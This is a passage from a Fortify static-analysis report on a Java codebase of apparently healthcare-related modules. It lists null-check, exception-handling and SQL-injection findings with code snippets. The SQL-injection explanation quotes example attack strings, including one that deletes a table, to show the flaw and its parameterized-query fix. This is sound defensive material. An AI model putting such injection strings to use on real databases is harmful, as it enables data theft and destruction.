<FileName>CNSITagUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/util/CNSITagUtil.java</FilePath>
<LineStart>29</LineStart>
<Snippet>	{
		ActionMapper m_objActionMapper = ActionMapper.getInstance();
		String targetModule  = (String)p_request.getAttribute("TargetModule");
		String targetPage = (String)p_request.getAttribute("TargetPage");
		String beanName = m_objActionMapper.getPageAttributeValue(targetModule , targetPage , "pageFormBeanName");</Snippet>
<TargetFunction>targetModule = getAttribute(...) : ServletRequest.getAttribute may return NULL()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1C0307964022A5F78649B44D0E176769" ruleID="4280F38B-9FDB-454E-B495-89CF45CD51B7">
                            <Category>Missing Check against Null</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The method readBeanMemberValue() in CNSITagUtil.java can dereference a null-pointer on line 45 because it does not check the return value of getAttribute(), which might return null.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSITagUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/util/CNSITagUtil.java</FilePath>
<LineStart>43</LineStart>
<Snippet>	{
		ActionMapper m_objActionMapper = ActionMapper.getInstance();
		String targetModule  = (String)p_request.getAttribute("TargetModule");
		String targetPage = (String)p_request.getAttribute("TargetPage");
		String beanName = m_objActionMapper.getPageAttributeValue(targetModule , targetPage , "pageFormBeanName");</Snippet>
<TargetFunction>targetModule = getAttribute(...) : ServletRequest.getAttribute may return NULL()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="80F53F60F8FF9A090A192BEDF19A4417" ruleID="4280F38B-9FDB-454E-B495-89CF45CD51B7">
                            <Category>Missing Check against Null</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The method getFormBeanName() in CNSITagUtil.java can dereference a null-pointer on line 22 because it does not check the return value of getAttribute(), which might return null.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSITagUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/util/CNSITagUtil.java</FilePath>
<LineStart>20</LineStart>
<Snippet>	{
		ActionMapper m_objActionMapper = ActionMapper.getInstance();
		String targetModule  = (String)p_request.getAttribute("TargetModule");
		String targetPage = (String)p_request.getAttribute("TargetPage");
		String beanName = m_objActionMapper.getPageAttributeValue(targetModule , targetPage , "pageFormBeanName");</Snippet>
<TargetFunction>targetModule = getAttribute(...) : ServletRequest.getAttribute may return NULL()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="788698DEBCFDAA2FD74B7F9A50551B2D" ruleID="4280F38B-9FDB-454E-B495-89CF45CD51B7">
                            <Category>Missing Check against Null</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The method readFormBeanMemberValue() in CNSITagUtil.java can dereference a null-pointer on line 31 because it does not check the return value of getAttribute(), which might return null.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSITagUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/util/CNSITagUtil.java</FilePath>
<LineStart>30</LineStart>
<Snippet>		ActionMapper m_objActionMapper = ActionMapper.getInstance();
		String targetModule  = (String)p_request.getAttribute("TargetModule");
		String targetPage = (String)p_request.getAttribute("TargetPage");
		String beanName = m_objActionMapper.getPageAttributeValue(targetModule , targetPage , "pageFormBeanName");
		</Snippet>
<TargetFunction>targetPage = getAttribute(...) : ServletRequest.getAttribute may return NULL()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F612C83654CFAD0C02A5256B42E45783" ruleID="4280F38B-9FDB-454E-B495-89CF45CD51B7">
                            <Category>Missing Check against Null</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The method getFormBeanName() in CNSITagUtil.java can dereference a null-pointer on line 22 because it does not check the return value of getAttribute(), which might return null.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSITagUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/util/CNSITagUtil.java</FilePath>
<LineStart>21</LineStart>
<Snippet>		ActionMapper m_objActionMapper = ActionMapper.getInstance();
		String targetModule  = (String)p_request.getAttribute("TargetModule");
		String targetPage = (String)p_request.getAttribute("TargetPage");
		String beanName = m_objActionMapper.getPageAttributeValue(targetModule , targetPage , "pageFormBeanName");
		return beanName;</Snippet>
<TargetFunction>targetPage = getAttribute(...) : ServletRequest.getAttribute may return NULL()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="380">
                        <groupTitle>Poor Error Handling: Overly Broad Throws</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method addCacheMgr() in CacheManagerRepository.java throws a generic exception making it harder for callers to do a good job of error handling and recovery.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Declaring a method to throw Exception or Throwable makes it difficult for callers to do good error handling and error recovery. Java's exception mechanism is set up to make it easy for callers to anticipate what can go wrong and write code to handle each specific exceptional circumstance. Declaring that a method throws a generic form of exception defeats this system.

Example: The following method throws three types of exceptions.


public void doExchange()
  throws IOException, InvocationTargetException,
         SQLException {
  ...
}



While it might seem tidier to write


public void doExchange()
  throws Exception {
  ...
}


doing so hampers the caller's ability to understand and handle the exceptions that occur. Further, if a later revision of doExchange() introduces a new type of exception that should be treated differently than previous exceptions, there is no easy way to enforce this requirement.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Do not declare methods to throw Exception or Throwable. If the exceptions thrown by a method are not recoverable or should not generally be caught by the caller, consider throwing unchecked exceptions rather than checked exceptions. This can be accomplished by implementing exception classes that extend RuntimeException or Error instead of Exception, or add a try/catch wrapper in your method to convert checked exceptions to unchecked exceptions.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>380</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="B5C77AE05350B7ADB78009FF81ADF997" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>The method addCacheMgr() in CacheManagerRepository.java throws a generic exception making it harder for callers to do a good job of error handling and recovery.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CacheManagerRepository.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/CacheManagerRepository.java</FilePath>
<LineStart>28</LineStart>
<Snippet>  @throws Exception all the exceptions are thrown back.
 */
public  void addCacheMgr(String p_sKey,CacheManager p_objCachemgr)
                                        throws Exception;
/**</Snippet>
<TargetFunction>Function: addCacheMgr()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2F9C3CA0AB3E836DF68D3930052B211F" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>The method changeFileLocationAndNameClaimsLoad() in FileUtil.java throws a generic exception making it harder for callers to do a good job of error handling and recovery.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>797</LineStart>
<Snippet>     */
//Start MI_TEAM 17/07/08 WA to MI Framework changes
    private static boolean changeFileLocationAndNameClaimsLoad(String p_sOriginalFileName,
                                                               boolean p_bIsOriginalRemote,
                                                               String p_sNewFileName,</Snippet>
<TargetFunction>Function: changeFileLocationAndNameClaimsLoad()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AAEE42169DAF9C4A53A65FC2FBDD5581" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>The method getCacheMgr() in CacheManagerRepository.java throws a generic exception making it harder for callers to do a good job of error handling and recovery.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CacheManagerRepository.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/CacheManagerRepository.java</FilePath>
<LineStart>39</LineStart>
<Snippet> */

public  CacheManager getCacheMgr(String p_sKey)
                                        throws Exception;
/**</Snippet>
<TargetFunction>Function: getCacheMgr()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3417F1419257FB52D8E25F30A3629191" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>The method processAlertMessage() in CacheManagerRepository.java throws a generic exception making it harder for callers to do a good job of error handling and recovery.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CacheManagerRepository.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/CacheManagerRepository.java</FilePath>
<LineStart>58</LineStart>
<Snippet> */

public  boolean processAlertMessage(String p_sCacheMgrName,Collection p_objRefreshKeys)
                                        throws Exception;
</Snippet>
<TargetFunction>Function: processAlertMessage()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9A32B4E19337FA35A4A2C0958C97B9DB" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>The method removeCacheMgr() in CacheManagerRepository.java throws a generic exception making it harder for callers to do a good job of error handling and recovery.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CacheManagerRepository.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/CacheManagerRepository.java</FilePath>
<LineStart>67</LineStart>
<Snippet>  @throws Exception all the exceptions are thrown back.
 */
public void removeCacheMgr(String p_sKey)  throws Exception;

}</Snippet>
<TargetFunction>Function: removeCacheMgr()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="315">
                        <groupTitle>SQL Injection: Persistence</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>On line 38 of NLRArtifactDetailDAOImpl.java, the method findByHeaderSid() invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>SQL injection errors occur when:

1. Data enters a program from an untrusted source.

In this case, Fortify Static Code Analyzer could not determine that the source of the data is trusted.

2. The data is used to dynamically construct a SQL query.



Example 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.


...
        String userName = ctx.getAuthenticatedUserName();
        String itemName = request.getParameter("itemName");
        String query = "SELECT * FROM items WHERE owner = '"
                                + userName + "' AND itemname = '"
                                + itemName + "'";
        ResultSet rs = stmt.execute(query);
...


The query intends to execute the following code:


        SELECT * FROM items
        WHERE owner = &lt;userName&gt;
        AND itemname = &lt;itemName&gt;;


However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string "name' OR 'a'='a" for itemName, then the query becomes the following:


        SELECT * FROM items
        WHERE owner = 'wiley'
        AND itemname = 'name' OR 'a'='a';


The addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:


        SELECT * FROM items;


This simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.

Example 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string "name'; DELETE FROM items; --" for itemName, then the query becomes the following two queries:


        SELECT * FROM items
        WHERE owner = 'wiley'
        AND itemname = 'name';

        DELETE FROM items;

        --'


Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.

Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one used in Example 1. If an attacker enters the string "name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a", the following three valid statements will be created:


        SELECT * FROM items
        WHERE owner = 'wiley'
        AND itemname = 'name';

        DELETE FROM items;

        SELECT * FROM items WHERE 'a'='a';


Some think that in the mobile world, classic web application vulnerabilities, such as SQL injection, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.

Example 3: The following code adapts Example 1 to the Android platform.


...
        PasswordAuthentication pa = authenticator.getPasswordAuthentication();
        String userName = pa.getUserName();
        String itemName = this.getIntent().getExtras().getString("itemName");
        String query = "SELECT * FROM items WHERE owner = '"
                                + userName + "' AND itemname = '"
                                + itemName + "'";
        SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);
        Cursor c = db.rawQuery(query, null);
...


One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:

    - Target fields that are not quoted
    - Find ways to bypass the need for certain escaped metacharacters
    - Use stored procedures to hide the injected metacharacters

Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.

Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>The root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but when user-supplied data needs to be included, they create bind parameters, which are placeholders for data that is subsequently inserted. Bind parameters allow the program to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for the value of each of the bind parameters, without the risk of the data being interpreted as commands.

Example 1 can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:


...
        String userName = ctx.getAuthenticatedUserName();
        String itemName = request.getParameter("itemName");
        String query =
                "SELECT * FROM items WHERE itemname=? AND owner=?";
        PreparedStatement stmt = conn.prepareStatement(query);
        stmt.setString(1, itemName);
        stmt.setString(2, userName);
        ResultSet results = stmt.execute();
...


And here is an Android equivalent:


...
        PasswordAuthentication pa = authenticator.getPasswordAuthentication();
        String userName = pa.getUserName();
        String itemName = this.getIntent().getExtras().getString("itemName");
        String query = "SELECT * FROM items WHERE itemname=? AND owner=?";
        SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);
        Cursor c = db.rawQuery(query, new Object[]{itemName, userName});
...


More complicated scenarios, often found in report generation code, require that user input affect the command structure of the SQL statement, such as the addition of dynamic constraints in the WHERE clause. Do not use this requirement to justify concatenating user input into query strings. Prevent SQL injection attacks where user input must affect statement command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. A common mistake is to use parameterized SQL statements that are constructed by concatenating user-controlled strings. Of course, this defeats the purpose of using parameterized SQL statements. If you are not certain that the strings used to form statements are constants controlled by the application, do not assume that they are safe because they are not being executed directly as SQL strings. Thoroughly investigate all uses of user-controlled strings in SQL statements and verify that none can be used to modify the meaning of the query.

2. Data is untrustworthy if it originates from public non-final string fields of a class. These types of fields may be modified by an unknown source.

3. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>315</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="58BA0FE9B7F3B1C5269804088E164CFA" ruleID="97CC66FE-E166-485A-B22B-55D6A97F610C">
                            <Category>SQL Injection: Persistence</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>On line 38 of NLRArtifactDetailDAOImpl.java, the method findByHeaderSid() invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>NLRArtifactDetailDAOImpl.java</FileName>
<FilePath>EHR-DOCS-JAR/src/com/ehr/service/impl/NLRArtifactDetailDAOImpl.java</FilePath>
<LineStart>38</LineStart>
<Snippet>     */
	public NLRArtifactDetail findByHeaderSid(long nlrArtifactHeaderSid){
		Query q = em.createQuery(EHRDocsSQLConstants.SQL_GET_EHR_ARTIFACT_DETAIL_SEQ.toString());
		q.setParameter(1, nlrArtifactHeaderSid);
	    return (NLRArtifactDetail)q.getResultList().get(0);</Snippet>
<TargetFunction>createQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="426FB2517049C600872E9CB33E734361" ruleID="97CC66FE-E166-485A-B22B-55D6A97F610C">
                            <Category>SQL Injection: Persistence</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>On line 54 of NLRPrvdrHospCalcDAOImpl.java, the method getNLRPrvdrHospCalcList() invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>NLRPrvdrHospCalcDAOImpl.java</FileName>
<FilePath>EHR-HOSP-JAR/src/com/ehr/service/NLRPrvdrHospCalcDAOImpl.java</FilePath>
<LineStart>54</LineStart>
<Snippet>	@SuppressWarnings("unchecked")
	public List&lt;NLRPrvdrHospCalc&gt; getNLRPrvdrHospCalcList(String confirmation_nmbr) {
		Query q = em.createQuery(EHRHospSQLConstants.RETRIEVE_NLR_PRVDR_HOSP_CALC_INFO.toString());
		q.setParameter(1, confirmation_nmbr);
		</Snippet>
<TargetFunction>createQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D734CF3A428E3083739EEC69F3196F3C" ruleID="97CC66FE-E166-485A-B22B-55D6A97F610C">
                            <Category>SQL Injection: Persistence</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>On line 49 of NLRPrvdrRegAppealCommentDAOImpl.java, the method findByAppealId() invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>NLRPrvdrRegAppealCommentDAOImpl.java</FileName>
<FilePath>EHR-DOCS-JAR/src/com/ehr/service/NLRPrvdrRegAppealCommentDAOImpl.java</FilePath>
<LineStart>49</LineStart>
<Snippet>	public List&lt;NLRPrvdrRegAppealComment&gt; findByAppealId(long nlrPrvdrRegAppealSid) {
		String l_sQuery = SQL_GET_NLR_APPEAL_INFO.toString();
		Query q = em.createQuery(l_sQuery);
		q.setParameter(1, nlrPrvdrRegAppealSid);
				 </Snippet>
<TargetFunction>createQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3FBC10E7A12089C9BC6979CB1F335790" ruleID="97CC66FE-E166-485A-B22B-55D6A97F610C">
                            <Category>SQL Injection: Persistence</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>On line 52 of NLRDisputeDAOImpl.java, the method getNLRDisputeListForSingleRegistration() invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>NLRDisputeDAOImpl.java</FileName>
<FilePath>EHR-DOCS-JAR/src/com/ehr/service/NLRDisputeDAOImpl.java</FilePath>
<LineStart>52</LineStart>
<Snippet>	@SuppressWarnings("unchecked")
	public List&lt;NLRDispute&gt; getNLRDisputeListForSingleRegistration(long nlrPrvdrRegistrationSid) {
		Query q = em.createQuery(SQL_GET_NLR_DISPUTES_FOR_REGISTRATION_ID.toString());
		q.setParameter(1, nlrPrvdrRegistrationSid);
		return (List&lt;NLRDispute&gt;)q.getResultList();</Snippet>
<TargetFunction>createQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FD16CD78C3A8F13AEAA9094FA70BCB33" ruleID="97CC66FE-E166-485A-B22B-55D6A97F610C">
                            <Category>SQL Injection: Persistence</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>On line 52 of NLRPrvdrHospCalcDrvdDAOImpl.java, the method getNLRPrvdrHospCalcDrvdList() invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>NLRPrvdrHospCalcDrvdDAOImpl.java</FileName>
<FilePath>EHR-HOSP-JAR/src/com/ehr/service/NLRPrvdrHospCalcDrvdDAOImpl.java</FilePath>
<LineStart>52</LineStart>
<Snippet>	@SuppressWarnings("unchecked")
	public List&lt;NLRPrvdrHospCalcDrvd&gt; getNLRPrvdrHospCalcDrvdList(long nlrPrvdrHospCalcSid) {
		Query q = em.createQuery(EHRHospSQLConstants.RETRIEVE_NLR_PRVDR_HOSP_CALC_DRVD_INFO.toString());
		q.setParameter(1, nlrPrvdrHospCalcSid);
		</Snippet>
<TargetFunction>createQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="281">
                        <groupTitle>Poor Error Handling: Overly Broad Catch</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The catch block at AppAreaDetCacheMgr.java line 206 handles a broad swath of exceptions,  potentially trapping dissimilar issues or problems that should not be dealt with at this point in the program.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Multiple catch blocks can get repetitive, but "condensing" catch blocks by catching a high-level class such as Exception can obscure exceptions that deserve special treatment or that should not be caught at this point in the program. Catching an overly broad exception essentially defeats the purpose of Java's typed exceptions, and can become particularly dangerous if the program grows and begins to throw new types of exceptions. The new exception types will not receive any attention.

Example: The following code excerpt handles three types of exceptions in an identical fashion.


  try {
    doExchange();
  }
  catch (IOException e) {
    logger.error("doExchange failed", e);
  }
  catch (InvocationTargetException e) {
    logger.error("doExchange failed", e);
  }
  catch (SQLException e) {
    logger.error("doExchange failed", e);
  }


At first blush, it may seem preferable to deal with these exceptions in a single catch block, as follows:


  try {
    doExchange();
  }
  catch (Exception e) {
    logger.error("doExchange failed", e);
  }


However, if doExchange() is modified to throw a new type of exception that should be handled in some different kind of way, the broad catch block will prevent the compiler from pointing out the situation. Further, the new catch block will now also handle exceptions derived from RuntimeException such as ClassCastException, and NullPointerException, which is not the programmer's intent.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Do not catch broad exception classes such as Exception, Throwable, Error, or RuntimeException except at the very top level of the program or thread.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. The Fortify Secure Coding Rulepacks will not flag an overly broad catch block if the catch block in question immediately throws a new exception.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>281</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="B47CAC2AC06407E9A54B9F6AC0CBF7E0" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>The catch block at ECAMSInitializer.java line 237 handles a broad swath of exceptions,  potentially trapping dissimilar issues or problems that should not be dealt with at this point in the program.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ECAMSInitializer.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/ECAMSInitializer.java</FilePath>
<LineStart>237</LineStart>
<Snippet>                    //any exception thrown shall be logged and does not affect the contitunation
                    // of system.
            } catch(Exception ex) {
                //log the message.
                l_objLogger.log(Logger.SEVERITY_WARNING, null, l_sFnName, null, "Error loading Error xml " + ex.getMessage(), ex);</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="67C2D104A4E17260DA1C9543419DE15A" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>The catch block at MultipartRequest.java line 342 handles a broad swath of exceptions,  potentially trapping dissimilar issues or problems that should not be dealt with at this point in the program.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>MultipartRequest.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/multipartrequest/MultipartRequest.java</FilePath>
<LineStart>342</LineStart>
<Snippet>      return value;
    }
    catch (Exception e) {
      return null;
    }</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0BCDFB8069EBC20404B374AA04BEAFFF" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>The catch block at DbUtilImpl.java line 2148 handles a broad swath of exceptions,  potentially trapping dissimilar issues or problems that should not be dealt with at this point in the program.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>2148</LineStart>
<Snippet>                p_conDbConn.close();
            }
            catch (Exception ex)
            {
                // Note do not rethrow the exception, just log it</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="36494AFF23AA9957850DD64DF1B237EC" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>The catch block at FileUtil.java line 1101 handles a broad swath of exceptions,  potentially trapping dissimilar issues or problems that should not be dealt with at this point in the program.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>1101</LineStart>
<Snippet>            }
        }
        catch (Exception e) {

        }</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DB231DD19E96265E46BCD7095077B138" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>The catch block at AppAreaDetCacheMgr.java line 206 handles a broad swath of exceptions,  potentially trapping dissimilar issues or problems that should not be dealt with at this point in the program.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
